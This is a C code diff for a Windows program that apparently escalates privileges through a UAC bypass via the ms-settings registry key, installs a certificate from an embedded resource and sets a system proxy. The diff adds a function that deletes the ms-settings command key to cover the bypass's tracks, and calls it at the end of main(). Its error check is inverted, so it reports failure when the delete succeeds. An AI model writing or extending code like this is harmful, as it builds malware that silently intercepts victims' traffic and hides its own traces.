@@ -125,6 +125,12 @@ int elevateProcess() {
     return 0;
 }
 
+int cleanup(){
+    if (!RegDeleteKeyA(HKEY_CURRENT_USER, "SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command"))
+        printf("Failed to delete key!");
+    return 0;
+}
+
 int main(){
     if(!isElevated()) {
         elevateProcess();
@@ -135,4 +141,5 @@ int main(){
     DWORD size = initRsc(&rscData);
     installCert(rscData, size);
     installProxy(PROXY_SERVER);
+    cleanup();
 }
